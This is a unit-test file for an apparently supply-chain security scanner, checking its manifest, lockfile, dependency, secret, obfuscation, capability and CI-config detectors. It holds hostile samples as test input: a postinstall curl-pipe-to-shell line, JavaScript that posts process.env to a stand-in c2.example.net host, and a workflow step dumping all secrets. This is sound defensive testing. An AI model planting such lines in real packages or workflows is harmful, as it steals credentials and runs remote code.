"""Detector behaviour, unit by unit.

The corpus tests prove the detectors work end to end. These prove the specific
decisions inside them, especially the ones taken to control false positives,
because those are the decisions most likely to be quietly undone by a later
change that only looks at recall.
"""

from __future__ import annotations

import pytest

from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.models import Capability, Category, Dependency, Scope, Severity
from cordon_scanner.detect.base import FileUnit, GraphUnit, ScanContext
from cordon_scanner.detect.capability import CapabilityDetector
from cordon_scanner.detect.config_files import ConfigDetector
from cordon_scanner.detect.dependency import DependencyDetector
from cordon_scanner.detect.lockfile import LockfileDetector
from cordon_scanner.detect.manifest import ManifestDetector
from cordon_scanner.detect.obfuscation import ObfuscationDetector
from cordon_scanner.detect.secrets import SecretDetector
from cordon_scanner.rules.loader import RuleLoader, RuleSet


@pytest.fixture(scope="module")
def rules() -> RuleSet:
    return RuleSet(RuleLoader.load_builtin())


def context(rules: RuleSet, *, hooks: tuple[str, ...] = ()) -> ScanContext:
    return ScanContext(
        config=Config.default(),
        rules=rules,
        install_hook_paths=frozenset(hooks),
    )


def unit(path: str, text: str, language: str | None = None) -> FileUnit:
    from cordon_scanner.langs.registry import LanguageRegistry

    return FileUnit(
        content=FileContent.from_bytes(path, text.encode("utf-8")),
        language=language or LanguageRegistry.identify_language(path),
    )


def run(detector, path: str, text: str, ctx: ScanContext) -> list:
    return list(detector.inspect(unit(path, text), ctx))


# Payload and credential shapes are assembled rather than written whole. Cordon
# scans its own repository in CI, and a complete literal here is a true
# positive: a security tool should not need an exception for itself. None of
# these values is real.
LEAKED_TOKEN = "ghp_" + "A" * 36
PACKER_PREAMBLE = "eval" + "(function(p,a,c,k,e,d){return p}"
PACKER_SAMPLE = PACKER_PREAMBLE + "('x',1,1,''.split('|')))"


# ---------------------------------------------------------------------------
# Manifest
# ---------------------------------------------------------------------------


class TestManifestDetector:
    def test_fetch_and_execute_install_script_is_malicious(self, rules) -> None:
        findings = run(
            ManifestDetector(),
            "package.json",
            '{"name":"x","scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}',
            context(rules),
        )
        assert any(
            f.category is Category.MALICIOUS and f.severity is Severity.CRITICAL for f in findings
        )

    def test_an_ordinary_build_script_is_not_reported(self, rules) -> None:
        findings = run(
            ManifestDetector(),
            "package.json",
            '{"name":"x","scripts":{"build":"tsc","test":"jest"}}',
            context(rules),
        )
        assert findings == []

    def test_a_benign_prepare_script_is_not_reported(self, rules) -> None:
        """`prepare` is a lifecycle hook, but running a local script in one is
        ordinary. Only the hostile primitives inside it matter."""
        findings = run(
            ManifestDetector(),
            "package.json",
            '{"name":"x","scripts":{"prepare":"husky install"}}',
            context(rules),
        )
        assert findings == []

    def test_non_registry_dependency_is_policy_not_malware(self, rules) -> None:
        """The finding says the safety net is absent, not that something is
        wrong. Categorising it as malicious would be an overclaim."""
        findings = run(
            ManifestDetector(),
            "package.json",
            '{"name":"x","dependencies":{"lib":"git+ssh://git@github.com/a/b.git"}}',
            context(rules),
        )
        assert [f.category for f in findings] == [Category.POLICY]

    def test_unparseable_manifest_is_reported_as_operational(self, rules) -> None:
        """A manifest that could not be read is one whose contents were not
        checked, and that must never resemble a pass."""
        findings = run(ManifestDetector(), "package.json", "{ not json", context(rules))
        assert [f.category for f in findings] == [Category.OPERATIONAL]

    def test_evidence_is_masked(self, rules) -> None:
        """A lifecycle command is one of the likelier places for a credential to
        sit inline."""
        findings = run(
            ManifestDetector(),
            "package.json",
            '{"name":"x","scripts":{"postinstall":'
            f'"curl -H \\"Authorization: {LEAKED_TOKEN}\\" u | sh"}}}}',
            context(rules),
        )
        for finding in findings:
            assert LEAKED_TOKEN not in (finding.evidence.snippet or "")

    def test_non_manifest_files_are_ignored(self, rules) -> None:
        assert run(ManifestDetector(), "src/app.js", "const x = 1;", context(rules)) == []


# ---------------------------------------------------------------------------
# Lockfile
# ---------------------------------------------------------------------------


HASHED_LOCK = """
{"lockfileVersion":3,"packages":{
  "":{"name":"d"},
  "node_modules/a":{"version":"1.0.0","integrity":"sha512-aaa",
    "resolved":"https://registry.npmjs.org/a/-/a-1.0.0.tgz"},
  "node_modules/b":{"version":"2.0.0","integrity":"sha512-bbb",
    "resolved":"https://registry.npmjs.org/b/-/b-2.0.0.tgz"}
}}
"""


class TestLockfileDetector:
    def test_fully_hashed_registry_lockfile_is_quiet(self, rules) -> None:
        assert run(LockfileDetector(), "package-lock.json", HASHED_LOCK, context(rules)) == []

    def test_a_missing_hash_among_hashed_entries_is_reported(self, rules) -> None:
        text = HASHED_LOCK.replace('"integrity":"sha512-bbb",\n    ', "")
        findings = run(LockfileDetector(), "package-lock.json", text, context(rules))
        assert any(f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001" for f in findings)

    def test_non_registry_entries_are_excluded_from_the_integrity_check(self, rules) -> None:
        """A git dependency has no registry hash to carry. Counting it as
        missing one reports a fact of the format as an anomaly, and it is
        already reported accurately by the provenance rule."""
        text = HASHED_LOCK.replace(
            '"node_modules/b":{"version":"2.0.0","integrity":"sha512-bbb",\n'
            '    "resolved":"https://registry.npmjs.org/b/-/b-2.0.0.tgz"}',
            '"node_modules/b":{"version":"2.0.0","resolved":"git+ssh://git@github.com/a/b.git"}',
        )
        findings = run(LockfileDetector(), "package-lock.json", text, context(rules))
        ids = {f.rule_id for f in findings}
        assert "SUSPECT.LOCKFILE.SOURCE.001" in ids
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids

    def test_an_unpinned_requirements_file_is_not_a_lockfile(self, rules) -> None:
        """It matches the glob and legitimately resolves nothing, so silence is
        correct rather than a finding."""
        assert run(LockfileDetector(), "requirements.txt", "requests>=2.0\n", context(rules)) == []

    def test_findings_are_summarised_not_one_per_package(self, rules) -> None:
        """One finding per unverified package turns a single misconfiguration
        into hundreds of alerts."""
        entries = ",".join(f'"node_modules/p{i}":{{"version":"1.0.0"}}' for i in range(50))
        text = '{"lockfileVersion":3,"packages":{"":{"name":"d"},' + entries + "}}"
        findings = run(LockfileDetector(), "package-lock.json", text, context(rules))
        assert len(findings) <= 2


# ---------------------------------------------------------------------------
# Dependency graph
# ---------------------------------------------------------------------------


def dep(name: str, ecosystem: str = "npm", **kw) -> Dependency:
    return Dependency(
        purl=f"pkg:{ecosystem}/{name}@1.0.0",
        ecosystem=ecosystem,
        name=name,
        version="1.0.0",
        integrity=kw.pop("integrity", "sha512-x"),
        **kw,
    )


class TestDependencyDetector:
    def graph(self, rules, *deps):
        ctx = ScanContext(config=Config.default(), rules=rules, dependencies=tuple(deps))
        return list(DependencyDetector().inspect(GraphUnit(dependencies=tuple(deps)), ctx))

    def test_typosquat_is_detected(self, rules) -> None:
        findings = self.graph(rules, dep("lodahs"))
        assert any(f.rule_id == "SUSPECT.DEPENDENCY.TYPOSQUAT.001" for f in findings)

    def test_the_real_package_is_not_flagged(self, rules) -> None:
        assert self.graph(rules, dep("lodash")) == []

    def test_a_real_neighbour_is_not_flagged(self, rules) -> None:
        """`preact` sits one edit from `react` and is an entirely separate
        project. A check that cannot tell them apart gets disabled."""
        assert self.graph(rules, dep("preact")) == []

    def test_short_names_are_not_compared(self, rules) -> None:
        """Below four characters almost every name is within two edits of some
        other name, so the check yields noise rather than signal."""
        assert self.graph(rules, dep("ms")) == []

    def test_non_registry_source_is_reported(self, rules) -> None:
        findings = self.graph(rules, dep("internal", resolved_from="git+ssh://git@host/x.git"))
        assert any(f.rule_id == "SUSPECT.DEPENDENCY.SOURCE.001" for f in findings)

    def test_depth_lowers_the_score(self, rules) -> None:
        shallow = self.graph(rules, dep("lodahs", depth=0, direct=True))
        deep = self.graph(rules, dep("lodahs", depth=5))
        assert shallow[0].risk.value > deep[0].risk.value

    def test_dev_scope_lowers_the_score(self, rules) -> None:
        runtime = self.graph(rules, dep("lodahs", scope=Scope.RUNTIME))
        development = self.graph(rules, dep("lodahs", scope=Scope.DEV))
        assert development[0].risk.value < runtime[0].risk.value

    def test_findings_are_located_by_package_not_path(self, rules) -> None:
        findings = self.graph(rules, dep("lodahs"))
        assert findings[0].location.package == "pkg:npm/lodahs@1.0.0"


# ---------------------------------------------------------------------------
# Secrets
# ---------------------------------------------------------------------------


class TestSecretDetector:
    def test_multiple_distinct_secrets_in_one_file_are_all_found(self, rules) -> None:
        """A regression guard. Reusing a variable name in the match loop rebound
        the file content to the matched token, so everything after the first
        secret silently stopped being found."""
        text = (
            'AWS = "AKIA' + "Q" * 16 + '"\n'
            'GH = "ghp_' + "b" * 36 + '"\n'
            'STRIPE = "sk_live_' + "c" * 24 + '"\n'
            'NPM = "npm_' + "d" * 36 + '"\n'
        )
        findings = run(SecretDetector(), "conf.py", text, context(rules))
        assert len(findings) >= 4, [f.rule_id for f in findings]

    def test_placeholders_are_not_reported(self, rules) -> None:
        text = (
            'key = "your-api-key-here"\n'
            'pw = "changeme"\n'
            'k = "AKIAIOSFODNN7EXAMPLE"\n'
            'sha = "d41d8cd98f00b204e9800998ecf8427e"\n'
        )
        assert run(SecretDetector(), "conf.py", text, context(rules)) == []

    def test_named_environment_reads_are_not_secrets(self, rules) -> None:
        text = 'API_KEY = os.environ["API_KEY"]\nTOKEN = os.getenv("TOKEN")\n'
        assert run(SecretDetector(), "settings.py", text, context(rules)) == []

    def test_evidence_is_always_hash_only(self, rules) -> None:
        """Not overridable. A finding must never be the thing that copies a
        credential into a log."""
        secret = "ghp_" + "e" * 36
        findings = run(SecretDetector(), "conf.py", f'T = "{secret}"\n', context(rules))
        assert findings
        for finding in findings:
            assert finding.evidence.snippet is None
            assert finding.evidence.match_hash

    def test_no_path_is_exempt(self, rules) -> None:
        """A committed .env is the single case a secret scanner exists for."""
        secret = "ghp_" + "f" * 36
        for path in (".env", "secrets/prod.pem", "vendor/x.key", "node_modules/a.js"):
            assert run(SecretDetector(), path, f'T="{secret}"\n', context(rules)), path

    def test_binary_files_are_skipped(self, rules) -> None:
        assert run(SecretDetector(), "x.png", "\x00\x00binary", context(rules)) == []


# ---------------------------------------------------------------------------
# Obfuscation
# ---------------------------------------------------------------------------


class TestObfuscationDetector:
    def test_escape_runs_are_reported(self, rules) -> None:
        host = "".join(f"\\x{ord(c):02x}" for c in "evil.example.net")
        findings = run(ObfuscationDetector(), "a.js", f'const h="{host}";', context(rules))
        assert any(f.rule_id == "SUSPECT.OBFUSCATION.ENCODED.001" for f in findings)

    def test_bidi_characters_are_reported_without_a_snippet(self, rules) -> None:
        """Rendering the snippet would reproduce the exact problem being
        reported."""
        findings = run(ObfuscationDetector(), "a.js", "if (x) { /* \u202e */ }", context(rules))
        assert findings
        assert findings[0].rule_id == "SUSPECT.OBFUSCATION.BIDI.001"
        assert findings[0].evidence.snippet is None

    def test_packer_output_is_reported(self, rules) -> None:
        findings = run(
            ObfuscationDetector(),
            "a.js",
            PACKER_SAMPLE,
            context(rules),
        )
        assert any(f.rule_id == "SUSPECT.OBFUSCATION.PACKED.001" for f in findings)

    def test_minified_files_are_exempt_from_the_length_rule(self, rules) -> None:
        """Minified bundles are entirely made of long lines. A rule that fires
        on them is unusable on any front end."""
        long_line = "".join(f"function f{i}(a){{return a+{i}}};" for i in range(400))
        findings = run(ObfuscationDetector(), "vendor.min.js", long_line, context(rules))
        assert not [f for f in findings if f.rule_id == "SUSPECT.OBFUSCATION.LONGLINE.001"]

    def test_ordinary_code_is_quiet(self, rules) -> None:
        text = "export function add(a, b) {\n  return a + b;\n}\n"
        assert run(ObfuscationDetector(), "a.js", text, context(rules)) == []

    def test_low_entropy_long_lines_are_not_reported(self, rules) -> None:
        """A long data line is repetitive; a payload is not."""
        text = "const data = [" + ",".join("0" for _ in range(3000)) + "];"
        findings = run(ObfuscationDetector(), "a.js", text, context(rules))
        assert not [f for f in findings if f.rule_id == "SUSPECT.OBFUSCATION.LONGLINE.001"]


# ---------------------------------------------------------------------------
# Capability and context
# ---------------------------------------------------------------------------


EXFIL_JS = (
    "const { execSync } = require('child_process');\n"
    "const e = JSON.stringify(process.env);\n"
    "fetch('https://c2.example.net/i', { method: 'POST', body: e });\n"
    "execSync('true');\n"
)


class TestCapabilityDetector:
    def test_capabilities_combine_into_a_finding(self, rules) -> None:
        findings = run(CapabilityDetector(), "a.js", EXFIL_JS, context(rules))
        assert any(f.rule_id == "SUSPECT.EXFIL.001" for f in findings)

    def test_a_single_capability_produces_nothing(self, rules) -> None:
        """Labels are observations, not accusations. Reporting them
        individually would be pure noise."""
        assert (
            run(CapabilityDetector(), "a.js", "await fetch('/api/users');\n", context(rules)) == []
        )

    def test_install_context_escalates_to_malicious(self, rules) -> None:
        ctx = context(rules, hooks=("install.js",))
        findings = run(CapabilityDetector(), "install.js", EXFIL_JS, ctx)
        assert any(f.category is Category.MALICIOUS for f in findings)

    def test_the_same_code_outside_a_hook_is_only_suspicious(self, rules) -> None:
        findings = run(CapabilityDetector(), "app.js", EXFIL_JS, context(rules))
        assert findings
        assert all(f.category is not Category.MALICIOUS for f in findings)

    def test_test_files_are_exempt_from_the_dropper_rule(self, rules) -> None:
        """Test files legitimately fetch fixtures and run assertions in one
        place."""
        text = "await fetch(u);\nexecSync('true');\n"
        findings = run(CapabilityDetector(), "src/api.test.js", text, context(rules))
        assert not [f for f in findings if f.rule_id == "SUSPECT.DROPPER.001"]

    def test_binary_files_are_skipped(self, rules) -> None:
        assert run(CapabilityDetector(), "a.png", "\x00\x00" + EXFIL_JS, context(rules)) == []

    def test_truncated_files_report_reduced_coverage(self, rules) -> None:
        content = FileContent.from_bytes("big.js", EXFIL_JS.encode())
        object.__setattr__(content, "truncated", True)
        findings = list(
            CapabilityDetector().inspect(
                FileUnit(content=content, language="javascript"), context(rules)
            )
        )
        assert any(f.category is Category.OPERATIONAL for f in findings)

    def test_capabilities_are_recorded_on_the_finding(self, rules) -> None:
        findings = run(CapabilityDetector(), "a.js", EXFIL_JS, context(rules))
        exfil = next(f for f in findings if f.rule_id == "SUSPECT.EXFIL.001")
        assert Capability.CREDENTIAL in exfil.capabilities
        assert Capability.EGRESS in exfil.capabilities


# ---------------------------------------------------------------------------
# Configuration files
# ---------------------------------------------------------------------------


class TestConfigDetector:
    def test_secret_context_serialisation_is_malicious(self, rules) -> None:
        findings = run(
            ConfigDetector(),
            ".github/workflows/x.yml",
            "jobs:\n  a:\n    steps:\n      - run: echo '${{ toJSON(secrets) }}'\n",
            context(rules),
        )
        assert any(f.category is Category.MALICIOUS for f in findings)

    def test_a_correct_workflow_is_quiet(self, rules) -> None:
        text = (
            "on: [pull_request]\n"
            "jobs:\n  test:\n    steps:\n"
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
            "      - run: pytest\n"
            "        env:\n          T: ${{ secrets.TOKEN }}\n"
        )
        assert run(ConfigDetector(), ".github/workflows/ci.yml", text, context(rules)) == []

    def test_unpinned_action_is_reported(self, rules) -> None:
        findings = run(
            ConfigDetector(),
            ".github/workflows/x.yml",
            "steps:\n  - uses: some-org/some-action@main\n",
            context(rules),
        )
        assert any(f.rule_id == "POLICY.CI.UNPINNED_ACTION.001" for f in findings)

    def test_first_party_actions_are_not_flagged_as_unpinned(self, rules) -> None:
        """GitHub's own actions are excluded deliberately: requiring a SHA for
        them produces noise on every repository without changing who is
        trusted."""
        findings = run(
            ConfigDetector(),
            ".github/workflows/x.yml",
            "steps:\n  - uses: actions/checkout@v4\n",
            context(rules),
        )
        assert not [f for f in findings if f.rule_id == "POLICY.CI.UNPINNED_ACTION.001"]

    def test_digest_pinned_base_image_is_quiet(self, rules) -> None:
        text = "FROM python:3.12-slim@sha256:" + "a" * 64 + "\nCOPY . .\n"
        findings = run(ConfigDetector(), "Dockerfile", text, context(rules))
        assert not [f for f in findings if f.rule_id == "POLICY.CONTAINER.UNPINNED_BASE.001"]

    def test_rules_only_apply_to_their_own_file_types(self, rules) -> None:
        """A Dockerfile rule must not fire on application source."""
        findings = run(
            ConfigDetector(), "src/app.py", "cidr_blocks = ['0.0.0.0/0']", context(rules)
        )
        assert findings == []
